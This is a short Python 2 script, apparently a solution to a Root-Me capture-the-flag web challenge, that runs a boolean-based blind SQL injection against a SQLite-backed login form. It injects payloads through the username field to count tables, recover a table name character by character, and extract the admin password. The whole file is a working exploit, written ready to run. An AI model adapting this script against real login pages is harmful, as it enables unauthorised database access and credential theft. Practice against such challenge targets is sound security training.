import requests
import string

chars = string.printable
filtered = ''
passwd = ''
num_table=0
len_table_name=0
table_name=''

for i in range(1,10):
	Data = {"username" : "admin' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' )="+str(i)+"-- -", "password":"123"}
	r = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', data = Data)
	print "number_table: " + str(i)
	if "admin" in r.text:
		num_table=i
		print "++++++++++++++"
		break
	
for k in range(1,15):
	Data = {"username" : "admin' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)="+str(k)+"-- -", "password":"123"}
	r = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', data = Data)
	print "length_table_name: " + str(k)
	if "admin" in r.text:
		len_table_name=k
		print "++++++++++++++"
		break

for l in range(1, len_table_name + 1):
	for c in chars:
		Data = {"username" : "admin' and (SELECT substr(tbl_name,"+ str(l) + ",1) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) ='" + c +"'-- -", "password":"123"}
		r = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', data = Data)
		print "table_name: " + str(l)+ " " + c
		if "admin" in r.text:
			table_name = table_name + c
			print "++++++++++++++"
			break
			
for p in range(1, 30):
	for q in chars:
		Data = {"username" : "admin' and (SELECT substr(password,"+ str(p) + ",1) FROM " + table_name + " where username = 'admin' limit 1 offset 0) ='" + q + "'-- -", "password":"123"}
		r = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', data = Data)
		print "password: " + str(p)+ " " + q
		if "admin" in r.text:
			passwd = passwd + q
			print "++++++++++++++"
			break
	if q == ' ':
		break
	
print "number_table: " + str(num_table)
print "length_table_name: " + str(len_table_name)
print "table_name: " + table_name
print "password: " + passwd

